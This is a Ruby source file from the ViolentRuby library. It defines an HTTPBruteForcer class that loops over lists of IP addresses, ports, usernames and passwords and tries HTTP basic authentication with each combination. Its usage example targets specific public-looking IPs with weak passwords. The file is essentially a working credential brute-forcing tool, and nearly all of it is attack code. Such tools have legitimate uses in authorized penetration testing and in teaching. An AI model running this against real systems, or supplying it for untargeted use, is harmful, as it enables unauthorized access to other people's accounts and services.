require 'net/http'

module ViolentRuby
	# HTTPBruteForcer can be used to brute force basic HTTP authentication as 
	# described in RFC2617
	# @author 'Gr3atWh173'
	#
	# @example Usage
	# 	require 'violent_ruby'
	#		h = ViolentRuby::HTTPBruteForcer.new
	#		h.users = ["admin", "root", "picatz", "gr3atwh173"]
	#		h.passwords = ["password", "!2345667", "guesswhat", "dragon"]
	#		h.ips = ["90.3.42.4", "173.2.42.3"]
	#		h.ports = ["80"]
	#		h.brute_force do |result|
	#			if result[:type] == "SUCCESS"
	#				puts "YAY!"
	#			end
	#		end
	class HTTPBruteForcer

		# @attr [Array] users array of usernames
		attr_accessor :users
		# @attr [Array] passwords array of passwords
		attr_accessor :passwords
		# @attr [Array] ips array of IP addresses
		attr_accessor :ips
		# @attr [Array] ports array of ports
		attr_accessor :ports

		# Initializes the HTTPBruteForcer
		#
		# Params
		# @param [Hash] args Options (same as FtpBruteForcer's)
		def initialize(args = {})
			self.users = process_args(args[:users])
			self.passwords = process_args(args[:passwords])
			self.ips = process_args(args[:ips])
			self.ports = process_args(args[:ports])
		end

		# Start the brute force attack.
		def brute_force
			results = []
			self.users = file_to_array(self.users)
			self.passwords = file_to_array(self.passwords)
			self.ports = file_to_array(self.ports)
			self.ips = file_to_array(self.ips)
			self.ips.each do |ip|
				self.ports.each do |port|
					self.users.each do |user|
						self.passwords.each do |password|
							if connectable?(ip, port) 
								if able_to_login?(ip: ip, password: password, user: user, port: port)
									result = format_result("SUCCESS", ip, port, user, password)
								else
									result = format_result("FAILURE", ip, port, user, password)
								end
								results << result
								yield result if block_given?
							end
						end
					end
				end
			end
			results
		end
		
		# Checks to see if we can connect to 
		# the host or not.
		# Params:
		# +ip+:: The IP address of host
		# +port+:: The port of host
		def connectable?(ip, port)
			begin
				http = Net::HTTP.new(ip, port)
				req = Net::HTTP::Get.new("/")
				http.request(req)
				return true
			rescue => e
				puts e
				return false
			end
		end

		# Checks if we can login
		# @param [Hash] args Options (same as FtpBruteForcer's)
		def able_to_login?(args = {})
			http = Net::HTTP.new(args[:ip], args[:port])
			req = Net::HTTP::Get.new("/")
			req.basic_auth(args[:user], args[:password])
			http.request(req).code == "200"
		end

		alias brute_force! brute_force

		private

		# @api private
		# Process arguments
		def process_args(arg)
			if arg.is_a? Array or arg.is_a? NilClass
				return arg
			else
				file_to_array(arg)
			end
		end
		
		# @api private
		# Convert contents of file to array
		def file_to_array(arg)
			# FIXME: We're reading full file into memory. Bad practice. Fix asap.
			return arg if arg.is_a? Array
			raise ArgumentError, "Arg must be a file" unless File.file? arg
			File.read(arg).split("\n").map(&:strip)
		end

		# @api private
		# Format the result in our desired form
		def format_result(type, ip, port, user, password)
			{ time: Time.now, type: type, ip: ip, port: port, user: user, password: password }
		end
	end
end
